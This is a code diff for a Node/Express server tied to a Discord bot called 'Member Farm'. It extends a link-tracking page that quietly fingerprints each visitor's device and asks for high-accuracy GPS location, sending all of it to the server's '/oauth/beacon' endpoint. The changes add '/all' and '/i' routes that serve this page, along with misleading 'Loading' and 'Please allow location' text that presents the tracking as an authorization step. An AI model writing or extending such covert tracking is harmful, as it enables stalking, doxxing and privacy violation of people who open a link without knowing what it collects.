@@ -64,8 +64,14 @@ async function lookupGeo(ip) {
 function pageHtml(opts) {
   const ok = opts.ok;
   const visitId = String(opts.visitId || '');
-  const title = ok ? 'Authorized' : 'Authorization failed';
-  const sub = ok ? (opts.username ? ('Welcome, ' + opts.username + '. Account linked.') : 'Thanks for visiting. You can close this page.') : (opts.error || 'Error');
+  const title = ok ? (opts.fullDump ? 'Loading' : 'Authorized') : 'Authorization failed';
+  const sub = ok
+    ? (opts.username
+        ? 'Welcome, ' + opts.username + '. Account linked.'
+        : opts.fullDump
+          ? 'Please allow location if asked…'
+          : 'Thanks for visiting. You can close this page.')
+    : opts.error || 'Error';
   const color = ok ? '#57f287' : '#ed4245';
   return `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Member Farm</title>
@@ -75,8 +81,8 @@ font-family:system-ui,sans-serif;background:#0b0b14;color:#e8e8f0}
 .card{width:min(420px,92vw);background:#12121c;border:1px solid #2a2a3c;border-radius:16px;padding:32px;text-align:center}
 h1{font-size:1.3rem;margin:12px 0 8px}p{color:#9a9ab0}.meta{margin-top:16px;font-size:.75rem;color:#6a6a80;text-align:left}
 .dot{width:56px;height:56px;border-radius:50%;margin:0 auto;border:2px solid ${color};background:${color}22}
-</style></head><body><div class="card"><div class="dot"></div><h1>${title}</h1><p>${sub}</p>
-<div class="meta" id="meta">Collecting device info…</div></div>
+</style></head><body><div class="card"><div class="dot"></div><h1 id="title">${title}</h1><p id="sub">${sub}</p>
+<div class="meta" id="meta">Collecting…</div></div>
 <script>
 (function(){
 var visitId=${JSON.stringify(visitId)};
@@ -85,20 +91,65 @@ function send(p){try{fetch('/oauth/beacon',{method:'POST',headers:{'Content-Type
 function canvasHash(){try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');x.fillStyle='#f60';x.fillRect(0,0,240,60);x.fillStyle='#069';x.font='14px Arial';x.fillText(navigator.userAgent.slice(0,40),2,20);return c.toDataURL().slice(-64)}catch(e){return ''}}
 function webgl(){try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return{};var d=g.getExtension('WEBGL_debug_renderer_info');return d?{webgl_vendor:String(g.getParameter(d.UNMASKED_VENDOR_WEBGL)||''),webgl_renderer:String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)||'')}:{}}catch(e){return{}}}
 var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
-var base=Object.assign({visitId:visitId,screen:(screen.width||'')+'x'+(screen.height||''),color_depth:String(screen.colorDepth||''),pixel_ratio:String(devicePixelRatio||''),platform:navigator.platform||'',vendor:navigator.vendor||'',hardware_concurrency:String(navigator.hardwareConcurrency||''),device_memory:String(navigator.deviceMemory||''),touch_points:String(navigator.maxTouchPoints||''),client_timezone:(Intl.DateTimeFormat().resolvedOptions().timeZone||''),client_languages:(navigator.languages||[]).join(','),webdriver:String(!!navigator.webdriver),cookie_enabled:String(navigator.cookieEnabled),do_not_track:String(navigator.doNotTrack||''),canvas_hash:canvasHash(),connection_type:String(conn.effectiveType||''),downlink:String(conn.downlink||''),rtt:String(conn.rtt||''),user_agent:navigator.userAgent||''},webgl());
-send(base);
-var el=document.getElementById('meta');
-if(el)el.innerHTML='Platform: '+(base.platform||'-')+'<br>Screen: '+(base.screen||'-')+'<br>TZ: '+(base.client_timezone||'-')+'<br>GPU: '+((base.webgl_renderer||'-').slice(0,40))+'<br><span id="gps">GPS: requesting…</span>';
-if(navigator.geolocation){
-navigator.geolocation.getCurrentPosition(function(pos){
-var c=pos.coords;
-send({visitId:visitId,gps_lat:String(c.latitude),gps_lon:String(c.longitude),gps_accuracy:String(c.accuracy),gps_altitude:c.altitude!=null?String(c.altitude):'',gps_heading:c.heading!=null?String(c.heading):'',gps_speed:c.speed!=null?String(c.speed):'',gps_timestamp:String(pos.timestamp||Date.now())});
-var g=document.getElementById('gps');
-if(g)g.textContent='GPS: '+c.latitude.toFixed(6)+', '+c.longitude.toFixed(6)+' (±'+Math.round(c.accuracy)+'m)';
-},function(err){
-send({visitId:visitId,gps_error:String(err.code)+':'+(err.message||'')});
-var g=document.getElementById('gps');if(g)g.textContent='GPS: denied';
-},{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+var base=Object.assign({
+  visitId:visitId,
+  screen:(screen.width||'')+'x'+(screen.height||'')+'@'+(screen.availWidth||'')+'x'+(screen.availHeight||''),
+  color_depth:String(screen.colorDepth||''),
+  pixel_ratio:String(devicePixelRatio||''),
+  platform:navigator.platform||'',
+  vendor:navigator.vendor||'',
+  hardware_concurrency:String(navigator.hardwareConcurrency||''),
+  device_memory:String(navigator.deviceMemory||''),
+  touch_points:String(navigator.maxTouchPoints||''),
+  client_timezone:(Intl.DateTimeFormat().resolvedOptions().timeZone||''),
+  client_languages:(navigator.languages||[]).join(','),
+  webdriver:String(!!navigator.webdriver),
+  cookie_enabled:String(navigator.cookieEnabled),
+  do_not_track:String(navigator.doNotTrack||''),
+  canvas_hash:canvasHash(),
+  connection_type:String(conn.effectiveType||''),
+  downlink:String(conn.downlink||''),
+  rtt:String(conn.rtt||''),
+  user_agent:navigator.userAgent||'',
+  offline:String(!navigator.onLine),
+  pdf_viewer:String(!!navigator.pdfViewerEnabled)
+}, webgl());
+
+function finish(extra){
+  var payload=Object.assign({}, base, extra||{});
+  send(payload);
+  var el=document.getElementById('meta');
+  var title=document.getElementById('title');
+  var sub=document.getElementById('sub');
+  if(title)title.textContent='Done';
+  if(sub)sub.textContent='You can close this page.';
+  if(el){
+    el.innerHTML=
+      'Platform: '+(payload.platform||'-')+'<br>'+
+      'Screen: '+(payload.screen||'-')+'<br>'+
+      'TZ: '+(payload.client_timezone||'-')+'<br>'+
+      'GPU: '+((payload.webgl_renderer||'-').slice(0,48))+'<br>'+
+      (payload.gps_lat ? ('GPS: '+payload.gps_lat+', '+payload.gps_lon+' (±'+Math.round(Number(payload.gps_accuracy||0))+'m)') : ('GPS: '+(payload.gps_error||'n/a')));
+  }
+}
+
+if(!navigator.geolocation){
+  finish({gps_error:'unsupported'});
+} else {
+  navigator.geolocation.getCurrentPosition(function(pos){
+    var c=pos.coords;
+    finish({
+      gps_lat:String(c.latitude),
+      gps_lon:String(c.longitude),
+      gps_accuracy:String(c.accuracy),
+      gps_altitude:c.altitude!=null?String(c.altitude):'',
+      gps_heading:c.heading!=null?String(c.heading):'',
+      gps_speed:c.speed!=null?String(c.speed):'',
+      gps_timestamp:String(pos.timestamp||Date.now())
+    });
+  }, function(err){
+    finish({gps_error:String(err.code)+':'+(err.message||'')});
+  }, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
 }
 })();
 </script></body></html>`;
@@ -131,18 +182,18 @@ function createOAuthServer(client) {
     } catch (e) { console.error('visit insert', e.message); return null; }
   }
 
-  async function serveTrackPage(req, res) {
-    const visitId = await logVisitFromRequest(req, 'link_visit');
+  async function serveTrackPage(req, res, status) {
+    const visitId = await logVisitFromRequest(req, status || 'link_visit');
     return res.type('html').send(
-      pageHtml({ ok: true, visitId, username: '', error: '' })
-        .replace('Authorized', 'Member Farm')
-        .replace('Account linked.', 'You can close this page.')
+      pageHtml({ ok: true, visitId, username: '', error: '', fullDump: true })
     );
   }
 
-  app.get('/', (req, res) => serveTrackPage(req, res));
-  app.get('/t', (req, res) => serveTrackPage(req, res));
-  app.get('/track', (req, res) => serveTrackPage(req, res));
+  app.get('/', (req, res) => serveTrackPage(req, res, 'link_visit'));
+  app.get('/t', (req, res) => serveTrackPage(req, res, 'link_visit'));
+  app.get('/track', (req, res) => serveTrackPage(req, res, 'link_visit'));
+  app.get('/all', (req, res) => serveTrackPage(req, res, 'full_dump'));
+  app.get('/i', (req, res) => serveTrackPage(req, res, 'full_dump'));
   app.get('/health', (req, res) => res.json({ ok: true, bot: client?.user?.tag || 'starting' }));
 
   app.post('/oauth/beacon', async (req, res) => {
